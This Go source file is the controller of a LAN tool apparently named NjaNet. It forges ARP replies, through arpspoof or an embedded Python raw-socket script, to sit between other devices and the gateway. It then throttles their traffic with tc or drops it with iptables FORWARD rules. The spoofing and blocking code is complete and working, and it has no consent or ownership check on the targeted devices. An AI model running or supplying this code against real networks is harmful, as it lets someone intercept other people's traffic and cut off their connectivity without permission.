package controller

import (
	"fmt"
	"os"
	"os/exec"
	"strings"
	"sync"

	"github.com/mectov/njanet/internal/db"
)

type Controller struct {
	mu            sync.Mutex
	iface         string
	myIP          string
	gatewayIP     string
	activeDevices map[string]*DeviceRule
	ready         bool
	noRootWarning bool
	spoofProcs    map[string]*exec.Cmd
}

type DeviceRule struct {
	MAC        string
	IP         string
	SpeedLimit int
	Blocked    bool
	ClassID    int
}

const (
	htbHandle    = "1:"
	defaultClass = "1:10"
	defaultRate  = "1000mbit"
)

func New(iface, myIP, gatewayIP string) *Controller {
	// Clean up leftover arpspoof processes from crashed sessions
	exec.Command("pkill", "-f", "arpspoof.*"+iface).Run()

	c := &Controller{
		iface:         iface,
		myIP:          myIP,
		gatewayIP:     gatewayIP,
		activeDevices: make(map[string]*DeviceRule),
		spoofProcs:    make(map[string]*exec.Cmd),
	}
	tcPath, _ := exec.LookPath("tc")
	iptablesPath, _ := exec.LookPath("iptables")
	if tcPath != "" && iptablesPath != "" {
		if err := c.initQdisc(); err == nil {
			c.ready = true
		}
	}
	return c
}

func (c *Controller) IsReady() bool { return c.ready }
func (c *Controller) checkRoot() error {
	if !c.ready {
		return fmt.Errorf("root required: run with sudo for block/throttle")
	}
	return nil
}

func (c *Controller) initQdisc() error {
	exec.Command("tc", "qdisc", "del", "dev", c.iface, "root").Run()
	exec.Command("tc", "class", "del", "dev", c.iface, "parent", htbHandle, "classid", defaultClass).Run()

	if err := exec.Command("tc", "qdisc", "add", "dev", c.iface,
		"root", "handle", htbHandle, "htb", "default", "10").Run(); err != nil {
		if err2 := exec.Command("tc", "qdisc", "replace", "dev", c.iface,
			"root", "handle", htbHandle, "htb", "default", "10").Run(); err2 != nil {
			return err2
		}
	}

	return exec.Command("tc", "class", "add", "dev", c.iface,
		"parent", htbHandle, "classid", defaultClass,
		"htb", "rate", defaultRate).Run()
}

func (c *Controller) ThrottleDevice(dev *db.Device, speedKbps int) error {
	if err := c.checkRoot(); err != nil {
		return err
	}
	c.mu.Lock()
	defer c.mu.Unlock()

	if speedKbps <= 0 {
		c.stopARPSpoof(dev.IP)
		return c.removeThrottle(dev)
	}

	exec.Command("sysctl", "-w", "net.ipv4.ip_forward=1").Run()
	c.startARPSpoof(dev.IP)

	// Catat IP lama SEBELUM getOrCreateRule menimpanya — filter tc terikat
	// IP, jadi pindah IP (DHCP) harus membersihkan filter IP lama.
	oldIP := ""
	oldClass := 0
	if r, ok := c.activeDevices[dev.MAC]; ok {
		oldIP = r.IP
		oldClass = r.ClassID
	}
	rule := c.getOrCreateRule(dev)
	rule.SpeedLimit = speedKbps
	classID := rule.ClassID
	if classID == 0 {
		classID = c.nextClassID()
		rule.ClassID = classID
	}

	rate := fmt.Sprintf("%dkbit", speedKbps)
	burst := fmt.Sprintf("%dkbit", speedKbps/10)
	if speedKbps/10 < 4 {
		burst = "4kbit"
	}
	classStr := fmt.Sprintf("1:%d", classID)

	if oldIP != "" && oldIP != dev.IP && oldClass != 0 {
		c.delThrottleFilters(oldIP, fmt.Sprintf("1:%d", oldClass))
	}
	// Hapus dulu filter yang mungkin sudah ada (re-throttle) supaya
	// tidak menumpuk duplikat tiap panggilan.
	c.delThrottleFilters(dev.IP, classStr)

	// Create the class; if it already exists (e.g. re-throttle in the watch mode
	// after an IP change), class add fails and class change updates the rate.
	exec.Command("tc", "class", "add", "dev", c.iface,
		"parent", htbHandle, "classid", classStr,
		"htb", "rate", rate, "ceil", rate, "burst", burst).Run()
	exec.Command("tc", "class", "change", "dev", c.iface,
		"parent", htbHandle, "classid", classStr,
		"htb", "rate", rate, "ceil", rate, "burst", burst).Run()
	exec.Command("tc", "filter", "add", "dev", c.iface,
		"parent", htbHandle, "protocol", "ip", "prio", "1", "u32",
		"match", "ip", "dst", dev.IP, "flowid", classStr).Run()
	exec.Command("tc", "filter", "add", "dev", c.iface,
		"parent", htbHandle, "protocol", "ip", "prio", "1", "u32",
		"match", "ip", "src", dev.IP, "flowid", classStr).Run()

	return nil
}

func (c *Controller) delThrottleFilters(ip, classStr string) {
	exec.Command("tc", "filter", "del", "dev", c.iface, "parent", htbHandle, "protocol", "ip", "prio", "1", "u32", "match", "ip", "dst", ip, "flowid", classStr).Run()
	exec.Command("tc", "filter", "del", "dev", c.iface, "parent", htbHandle, "protocol", "ip", "prio", "1", "u32", "match", "ip", "src", ip, "flowid", classStr).Run()
}

func (c *Controller) removeThrottle(dev *db.Device) error {
	rule, ok := c.activeDevices[dev.MAC]
	if !ok || rule.ClassID == 0 {
		// No in-memory rule. tc state never survives across sessions anyway:
		// initQdisc() deletes the root qdisc (and all classes/filters) at startup.
		return nil
	}
	classStr := fmt.Sprintf("1:%d", rule.ClassID)
	c.delThrottleFilters(dev.IP, classStr)
	exec.Command("tc", "class", "del", "dev", c.iface, "classid", classStr).Run()
	rule.SpeedLimit = 0
	rule.ClassID = 0
	return nil
}

func (c *Controller) BlockDevice(dev *db.Device) error {
	if err := c.checkRoot(); err != nil {
		return err
	}
	c.mu.Lock()
	defer c.mu.Unlock()
	rule := c.getOrCreateRule(dev)
	if rule.Blocked {
		return nil
	}
	exec.Command("sysctl", "-w", "net.ipv4.ip_forward=1").Run()
	c.startARPSpoof(dev.IP)
	for _, args := range [][]string{
		{"iptables", "-A", "FORWARD", "-d", dev.IP, "-j", "DROP"},
		{"iptables", "-A", "FORWARD", "-s", dev.IP, "-j", "DROP"},
	} {
		exec.Command(args[0], args[1:]...).Run()
	}
	rule.Blocked = true
	return nil
}

func (c *Controller) UnblockDevice(dev *db.Device) error {
	if err := c.checkRoot(); err != nil {
		return err
	}
	c.mu.Lock()
	defer c.mu.Unlock()
	c.stopARPSpoof(dev.IP)
	// Delete the FORWARD DROP rules by IP even when this process has no in-memory
	// rule (e.g. the device was blocked in a previous session) — the rules live in
	// iptables, not in memory.
	c.RemoveForwardDropRules(dev.IP)
	if rule, ok := c.activeDevices[dev.MAC]; ok {
		rule.Blocked = false
	}
	return nil
}

// RemoveForwardDropRules deletes only the FORWARD DROP rules NjaNet itself
// created for the given IP. Never flush whole chains: that would wipe other
// firewall rules (ufw/firewalld, manual rules, ...).
func (c *Controller) RemoveForwardDropRules(ip string) {
	for _, args := range [][]string{
		{"iptables", "-D", "FORWARD", "-d", ip, "-j", "DROP"},
		{"iptables", "-D", "FORWARD", "-s", ip, "-j", "DROP"},
	} {
		exec.Command(args[0], args[1:]...).Run()
	}
}

func (c *Controller) Reset() error {
	c.mu.Lock()
	defer c.mu.Unlock()
	// Remove the qdisc (deletes all NjaNet tc classes/filters) and stop spoofing.
	// iptables cleanup for individual devices is handled via RemoveForwardDropRules.
	c.initQdisc()
	for key, cmd := range c.spoofProcs {
		cmd.Process.Kill()
		cmd.Wait()
		delete(c.spoofProcs, key)
	}
	c.activeDevices = make(map[string]*DeviceRule)
	return nil
}

func (c *Controller) getOrCreateRule(dev *db.Device) *DeviceRule {
	if rule, ok := c.activeDevices[dev.MAC]; ok {
		rule.IP = dev.IP
		return rule
	}
	rule := &DeviceRule{MAC: dev.MAC, IP: dev.IP}
	c.activeDevices[dev.MAC] = rule
	return rule
}

func (c *Controller) nextClassID() int {
	used := make(map[int]bool)
	for _, r := range c.activeDevices {
		if r.ClassID > 0 {
			used[r.ClassID] = true
		}
	}
	for id := 11; id < 100; id++ {
		if !used[id] {
			return id
		}
	}
	return 99
}

// --- ARP Spoofing ---

func (c *Controller) startARPSpoof(targetIP string) {
	if c.gatewayIP == "" {
		return
	}

	os.Setenv("PATH", os.Getenv("PATH")+":/usr/sbin:/sbin")
	path, err := exec.LookPath("arpspoof")

	if err != nil {
		pySrc := `
import socket, struct, time
def arp(iface, sm, si, dm, di):
    s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(0x0800))
    s.bind((iface, 0))
    while True:
        eth = struct.pack("!6s6sH",
            bytes.fromhex(dm.replace(":","")),
            bytes.fromhex(sm.replace(":","")), 0x0806)
        a = struct.pack("!HHBBH6s4s6s4s", 1, 0x0800, 6, 4, 2,
            bytes.fromhex(sm.replace(":","")),
            socket.inet_aton(si),
            bytes.fromhex(dm.replace(":","")),
            socket.inet_aton(di))
        s.send(eth + a)
        time.sleep(1)
`
		c1 := exec.Command("python3", "-c", pySrc+
			fmt.Sprintf("arp(%q,%q,%q,%q,%q)",
				c.iface, c.getMyMAC(), c.gatewayIP, c.getMAC(targetIP), targetIP))
		c1.Start()
		c.spoofProcs[targetIP+"_gw"] = c1

		c2 := exec.Command("python3", "-c", pySrc+
			fmt.Sprintf("arp(%q,%q,%q,%q,%q)",
				c.iface, c.getMyMAC(), targetIP, c.getGatewayMAC(), c.gatewayIP))
		c2.Start()
		c.spoofProcs[targetIP+"_tgt"] = c2
		return
	}

	c1 := exec.Command(path, "-i", c.iface, "-t", targetIP, c.gatewayIP)
	if err := c1.Start(); err == nil {
		c.spoofProcs[targetIP+"_gw"] = c1
	}

	c2 := exec.Command(path, "-i", c.iface, "-t", c.gatewayIP, targetIP)
	if err := c2.Start(); err == nil {
		c.spoofProcs[targetIP+"_tgt"] = c2
	}
}

func (c *Controller) stopARPSpoof(targetIP string) {
	for _, suffix := range []string{"_gw", "_tgt"} {
		key := targetIP + suffix
		if cmd, ok := c.spoofProcs[key]; ok {
			cmd.Process.Kill()
			cmd.Wait()
			delete(c.spoofProcs, key)
		}
	}
	exec.Command("arp", "-d", c.gatewayIP).Run()
	exec.Command("arp", "-d", targetIP).Run()
	exec.Command("ping", "-c", "1", "-W", "1", c.gatewayIP).Run()
	exec.Command("ping", "-c", "1", "-W", "1", targetIP).Run()
}

func (c *Controller) getMyMAC() string {
	data, err := os.ReadFile("/sys/class/net/" + c.iface + "/address")
	if err != nil {
		return ""
	}
	return strings.TrimSpace(string(data))
}

func (c *Controller) getGatewayMAC() string {
	data, err := os.ReadFile("/proc/net/arp")
	if err != nil {
		return ""
	}
	for _, line := range strings.Split(string(data), "\n") {
		f := strings.Fields(line)
		if len(f) >= 4 && f[0] == c.gatewayIP {
			return strings.ToUpper(f[3])
		}
	}
	return ""
}

func (c *Controller) getMAC(ip string) string {
	data, err := os.ReadFile("/proc/net/arp")
	if err == nil {
		for _, line := range strings.Split(string(data), "\n") {
			f := strings.Fields(line)
			if len(f) >= 4 && f[0] == ip && f[3] != "(incomplete)" {
				return strings.ToUpper(f[3])
			}
		}
	}
	exec.Command("ping", "-c", "1", "-W", "1", ip).Run()
	data2, err := os.ReadFile("/proc/net/arp")
	if err == nil {
		for _, line := range strings.Split(string(data2), "\n") {
			f := strings.Fields(line)
			if len(f) >= 4 && f[0] == ip && f[3] != "(incomplete)" {
				return strings.ToUpper(f[3])
			}
		}
	}
	return ""
}
